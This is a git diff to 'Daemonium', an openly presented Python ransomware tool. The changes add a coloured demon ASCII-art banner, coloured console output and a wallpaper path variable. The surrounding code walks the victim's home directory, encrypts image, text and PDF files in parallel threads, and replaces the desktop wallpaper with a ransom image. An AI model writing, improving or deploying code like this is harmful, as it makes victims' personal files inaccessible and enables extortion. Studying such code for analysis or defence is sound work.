@@ -1,4 +1,3 @@
-# !/usr/bin/python3
 import os
 import platform
 import socket
@@ -6,6 +5,7 @@ import sqlite3
 import subprocess
 import threading
 import time
+import colorama
 import urllib.error
 from datetime import datetime, timedelta
 from pathlib import Path
@@ -35,7 +35,27 @@ class Daemonium:
     - uses RSA asymmetric encryption
     - capture basic computer data
     """
+
     def __init__(self):
+        print(colorama.Fore.RED + """
+                                    ,-.                               
+           ___,---.__          /'|`\          __,---,___          
+        ,-'    \`    `-.____,-'  |  `-.____,-'    //    `-.       
+      ,'        |           ~'\     /`~           |        `.      
+     /      ___//              `. ,'          ,  , \___      \    
+    |    ,-'   `-.__   _         |        ,    __,-'   `-.    |    
+    |   /          /\_  `   .    |    ,      _/\          \   |   
+    \  |           \ \`-.___ \   |   / ___,-'/ /           |  /  
+     \  \           | `._   `\\  |  //'   _,' |           /  /      
+      `-.\         /'  _ `---'' , . ``---' _  `\         /,-'     
+         ``       /     \    ,='/ \`=.    /     \       ''          
+                 |__   /|\_,--.,-.--,--._/|\   __|                  
+                 /  `./  \\`\ |  |  | /,//' \,'  \                  
+                /   /     ||--+--|--+-/-|     \   \                 
+               |   |     /'\_\_\ | /_/_/`\     |   |                
+                \   \__, \_     `~'     _/ .__/   /            
+                 `-._,-'   `-._______,-'   `-._,-'
+        """)
         self.__files: List[str] = [
             ".jpg", ".png", ".txt", ".pdf"
         ]
@@ -78,6 +98,7 @@ class Daemonium:
         else:
             time.sleep(5)
             try:
+                new_wallpaper_path = os.path.join(os.getcwd() + r'/daemonium.jpg')
                 subprocess.Popen([
                     "gsettings", "set", "org.gnome.desktop.background", "picture-uri",
                     "file://" + os.getcwd() + "/daemonium.jpg"
@@ -99,7 +120,7 @@ class Daemonium:
         for root, dirs, files in os.walk(home):
             for names in files:
                 if Path(os.path.join(root, names)).suffix in self.__files:
-                    threads.append(threading.Thread(target=self.__encrypt, args=(os.path.join(root, names), )))
+                    threads.append(threading.Thread(target=self.__encrypt, args=(os.path.join(root, names),)))
         [thread.start() for thread in threads]
         [thread.join() for thread in threads]
 
@@ -108,7 +129,7 @@ class Daemonium:
         cipher = self.__get_cipher()
 
         with open(file, 'rb') as f:
-            print(f"[+] Encrypting {file}")
+            print(colorama.Fore.LIGHTRED_EX + f"[+] Encrypting {file}")
             while True:
                 chunk = f.read(self.__BLOCK_SIZE)
                 if not chunk:
